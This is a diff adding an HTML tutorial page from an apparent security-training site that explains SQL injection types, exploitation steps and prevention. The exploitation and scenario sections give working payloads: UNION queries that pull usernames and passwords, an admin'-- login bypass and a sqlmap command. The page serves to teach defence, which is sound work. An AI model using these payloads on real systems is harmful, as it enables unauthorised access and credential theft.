@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>SQL Injection - Cybersecurity Academy</title>
+  <link rel="stylesheet" href="style.css"/>
+  <script src="scripts.js" defer></script>
+</head>
+<body class="dark-theme">
+
+  <header class="site-header">
+    <h1>💉 SQL Injection</h1>
+    <p class="subtitle">Master one of the most critical and dangerous vulnerabilities in web applications</p>
+  </header>
+
+  <main class="content">
+
+    <section class="intro">
+      <h2>What is SQL Injection?</h2>
+      <p>
+        SQL Injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries an application makes to its database. By injecting malicious SQL statements, attackers can bypass authentication, retrieve or manipulate data, and even gain full access to the server in severe cases.
+      </p>
+    </section>
+
+    <section class="types">
+      <h2>🧪 Types of SQL Injection</h2>
+
+      <div class="card">
+        <h3>1. Classic SQLi (In-band)</h3>
+        <p>Attacker gets immediate feedback. Includes:</p>
+        <ul>
+          <li><strong>Union-based:</strong> Extracts data using the <code>UNION</code> SQL operator</li>
+          <li><strong>Error-based:</strong> Leverages database error messages to extract data</li>
+        </ul>
+      </div>
+
+      <div class="card">
+        <h3>2. Blind SQLi</h3>
+        <p>No error messages or visible output. Data is inferred via:</p>
+        <ul>
+          <li><strong>Boolean-based:</strong> Injected payload causes a true/false condition</li>
+          <li><strong>Time-based:</strong> Uses SQL functions like <code>SLEEP()</code> to detect delays</li>
+        </ul>
+      </div>
+
+      <div class="card">
+        <h3>3. Out-of-Band SQLi</h3>
+        <p>Used when data exfiltration can't be done via the same channel. It requires database features like DNS or HTTP requests (e.g., <code>xp_dirtree</code> in MSSQL).</p>
+      </div>
+    </section>
+
+    <section class="step-by-step">
+      <h2>🧠 Step-by-Step: Exploiting SQL Injection</h2>
+
+      <h3>Step 1: Identify Injection Point</h3>
+      <p>Start with a simple payload in URL or form input:</p>
+      <pre><code>' OR '1'='1</code></pre>
+
+      <h3>Step 2: Test for Errors</h3>
+      <p>Use payloads to force SQL syntax errors:</p>
+      <pre><code>' OR 1=1-- -
+' ORDER BY 10-- -
+' UNION SELECT null, version()-- -</code></pre>
+
+      <h3>Step 3: Extract Data</h3>
+      <p>When confirmed, use a full UNION payload:</p>
+      <pre><code>' UNION SELECT username, password FROM users-- -</code></pre>
+
+      <h3>Step 4: Automate (Optional)</h3>
+      <p>Use <code>sqlmap</code> to automate discovery and exploitation:</p>
+      <pre><code>sqlmap -u "http://target.com/page.php?id=1" --dbs</code></pre>
+    </section>
+
+    <section class="real-world">
+      <h2>🌐 Real-World Scenario</h2>
+      <p>Consider the following vulnerable login form:</p>
+      <pre><code>POST /login HTTP/1.1
+Host: vulnerable.site
+Content-Type: application/x-www-form-urlencoded
+
+username=admin'--&password=anything</code></pre>
+      <p>This payload bypasses password verification by commenting out the second part of the SQL query.</p>
+    </section>
+
+    <section class="prevention">
+      <h2>🛡️ Prevention Techniques</h2>
+      <ul>
+        <li>✅ Use Prepared Statements (Parameterized Queries)</li>
+        <li>✅ Validate and sanitize all user input</li>
+        <li>✅ Use ORM frameworks (like SQLAlchemy, Django ORM)</li>
+        <li>✅ Apply least privilege to DB accounts</li>
+        <li>✅ Enable logging and monitoring of database errors</li>
+      </ul>
+    </section>
+
+    <section class="tips">
+      <h2>💡 Practical Tips</h2>
+      <ul>
+        <li>Never trust client-side validation alone — always sanitize on the server</li>
+        <li>Use <code>LIMIT</code> and <code>OFFSET</code> cautiously in dynamic queries</li>
+        <li>Isolate critical functions into stored procedures if possible</li>
+        <li>Disable detailed SQL error messages in production</li>
+      </ul>
+    </section>
+
+    <section class="resources">
+      <h2>📚 Tools & Learning Resources</h2>
+      <ul>
+        <li><a href="https://portswigger.net/web-security/sql-injection" target="_blank">PortSwigger Academy - SQLi</a></li>
+        <li><a href="https://github.com/sqlmapproject/sqlmap" target="_blank">SQLMap - GitHub</a></li>
+        <li><a href="https://owasp.org/www-community/attacks/SQL_Injection" target="_blank">OWASP - SQL Injection</a></li>
+        <li><a href="https://tryhackme.com/room/sqlinjection" target="_blank">TryHackMe - SQLi Room</a></li>
+        <li><a href="https://www.hackthebox.com/" target="_blank">Hack The Box Labs</a></li>
+      </ul>
+    </section>
+
+  </main>
+
+  <footer class="site-footer">
+    <p>BugDrillX © 2025 – Learn. Hack. Evolve. powered by <a href="https://pk.linkedin.com/company/scoltech" target="_blank">SCOLTECH</a></p>
+  </footer>
+
+</body>
+</html>
